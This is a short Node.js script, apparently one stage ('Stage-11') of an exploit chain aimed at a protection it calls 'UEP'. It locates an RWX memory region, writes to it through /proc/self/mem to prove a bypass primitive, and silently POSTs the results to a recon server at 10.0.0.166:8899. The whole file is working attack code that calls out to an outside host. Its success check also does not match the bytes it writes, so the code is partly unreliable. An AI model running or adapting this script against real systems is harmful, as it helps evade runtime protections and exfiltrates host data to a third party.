// Stage-11: prove /proc/self/mem self-write into own RWX region (UEP bypass primitive).
var fs = require('fs');
var http = require('http');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon11', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var out = {};
try {
  var maps = fs.readFileSync('/proc/self/maps', 'utf8').split('\n');
  var rwx = null;
  for (var i = 0; i < maps.length; i++) { if (/rwxp/.test(maps[i])) { rwx = maps[i]; break; } }
  out.rwx = rwx;
  if (rwx) {
    var end = parseInt(rwx.split('-')[1], 16);
    var addr = end - 64;
    var fd = fs.openSync('/proc/self/mem', 'r+');
    var w = Buffer.from([0x44, 0x43, 0x42, 0x41]);
    var nw = fs.writeSync(fd, w, 0, 4, addr);
    var r = Buffer.alloc(4);
    var nr = fs.readSync(fd, r, 0, 4, addr);
    fs.closeSync(fd);
    out.wrote = nw; out.readback = r.toString('hex'); out.ok = (r.toString('hex') === '41424344');
  }
} catch (e) { out.err = e.message; }
post(out);
